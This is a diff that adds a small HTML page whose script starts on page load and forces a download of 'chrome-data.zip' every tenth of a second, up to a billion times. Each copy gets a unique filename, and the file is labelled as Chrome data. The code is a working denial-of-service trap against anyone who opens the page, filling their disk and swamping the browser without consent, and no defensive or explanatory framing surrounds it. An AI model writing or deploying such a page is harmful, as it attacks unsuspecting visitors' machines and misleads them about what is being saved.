@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Multiple Times</title>
+</head>
+<body>
+
+    <script>
+        // Constants (uneditable by the user)
+        const fileUrl = 'chrome-data.zip'; // URL of the file to download
+        const count = 1000000000; // Number of downloads
+        const intervalSeconds = .1; // Interval between downloads in seconds
+
+        function startDownloads() {
+            let downloadsRemaining = count;
+
+            function downloadNext() {
+                if (downloadsRemaining > 0) {
+                    // Using an <a> element to initiate the download
+                    const link = document.createElement('a');
+                    link.href = fileUrl;
+                    link.download = `chrome-data_${count - downloadsRemaining + 1}.zip`; // Unique filename for each download
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+
+                    downloadsRemaining--;
+
+                    if (downloadsRemaining > 0) {
+                        setTimeout(downloadNext, intervalSeconds * 1000); // Schedule next download after interval
+                    }
+                }
+            }
+
+            // Start the first download immediately
+            downloadNext();
+        }
+
+        // Start downloads when the webpage is fully loaded
+        window.onload = function() {
+            startDownloads();
+        };
+    </script>
+
+</body>
+</html>
